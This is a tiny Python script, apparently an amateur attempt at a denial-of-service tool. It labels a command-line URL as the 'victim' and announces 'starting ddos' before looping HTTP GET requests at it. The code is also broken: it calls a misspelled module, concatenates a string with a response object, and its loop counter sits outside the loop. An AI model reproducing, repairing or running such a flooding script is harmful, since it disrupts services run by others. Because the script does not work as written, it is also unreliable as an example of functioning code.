
import requests, sys, time

print("victim: " + sys.argv[1])
print("[*] starting ddos...")
print()
time.sleep(1)

i = 1

while i < 10:
  r = request.get(sys.argv[1])
  print("[*] request sent: " + r)
i+=1
